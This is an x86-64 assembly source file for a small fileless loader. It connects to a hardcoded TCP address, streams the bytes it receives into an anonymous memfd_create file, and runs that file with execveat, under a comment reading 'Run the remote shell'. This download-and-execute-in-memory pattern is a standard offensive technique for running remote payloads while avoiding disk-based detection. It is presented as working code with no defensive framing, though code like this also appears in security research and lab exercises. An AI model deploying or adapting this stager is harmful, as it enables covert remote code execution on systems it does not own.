	section .text
	global _start
BITS 64
_start:
	;; Create socket
	;; Find contants with: grep -R CONSTANT /usr/include
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov 	rdi, 2		; PF_INET 2
	mov 	rsi, 1		; SOCK_STREAM
	mov 	rdx, 6              ; IPPROTO_TCP
	call 	_socket
	
	mov 	r12, rax		; FD should be 4 or 5
	;;  It is unlikely that the socket syscall will fail

	;; memfd_create ("a", 1)
	lea 	rdi, [rel fname]
	call 	_memfd_create
	mov 	r13, rax		; Save fd in R134

	;; connect (s [rbp+0], addr, 16)
	;; 	 	mov rdi, r8
 	mov 	edi, r12d		;Saves 1 byte
 	lea 	rsi, [rel addr]
	add 	edx,10
	call 	_connect
	;;	Just skip error check... if it fails is not gonna work anyway

	lea 	rsi, [rsp]
l0:	; Read loop
	;; Read data from socket
	;; _read (s = [rbp + 0], [rbp + 0x10], 1024);
	mov 	rdi, r12
	mov 	rdx, 1024
	call 	_read
	test 	ax,ax
	jle 	done

	;; Write to stdout
	;; _write (fd, [rbp+0x10], [rbp+0x08])
	mov 	rdi, r13
	mov 	rdx, rax
	call 	_write
	test 	ax,ax
	jle 	done
	jmp 	l0
done:
	mov 	rdi, r12
	call 	_close
	;;;  Run the remote shell

	mov 	rdi, r13
	lea 	rsi, [rel fname + 1]
	xor 	rdx, rdx
	xor 	r10, r10
	mov 	r8, 0x1000
	call 	_execat
	;; Syscalls
_read:
	xor 	eax,eax
	jmp 	_do_syscall
	 
_write:
	xor 	eax,eax
	inc 	eax
	jmp 	_do_syscall
	
_socket:
	;; mov rax, 41
	xor 	eax,eax
	add 	al, 41
	jmp 	_do_syscall
	
_connect:
	;; 	mov rax, 42
	xor 	eax,eax
	add 	al, 42
	jmp 	_do_syscall
	
_close:
	;; mov rax, 3
	xor 	eax,eax
	add 	al, 3
	jmp 	_do_syscall

_unlink:
        xor 	eax, eax
        add 	al, 87
        jmp 	_do_syscall
	
_execat:
	xor 	eax,eax
	add 	ax, 322
	jmp 	_do_syscall

	
_memfd_create:
	;; mov rax, 319
	xor 	eax,eax
	add 	ax, 319
	jmp 	_do_syscall
	
_fork:
        xor 	eax,eax
        add 	al, 57
        jmp 	_do_syscall

end:	
_exit:
        xor 	eax,eax
        add 	al, 60

_do_syscall:
	syscall
	ret
	
	addr    dq 0x1000007f11110002
	fname   db "a",0
	nullstr db 0
	div_tbl dw 10000, 1000, 100, 10, 1
filesize equ $ - $$
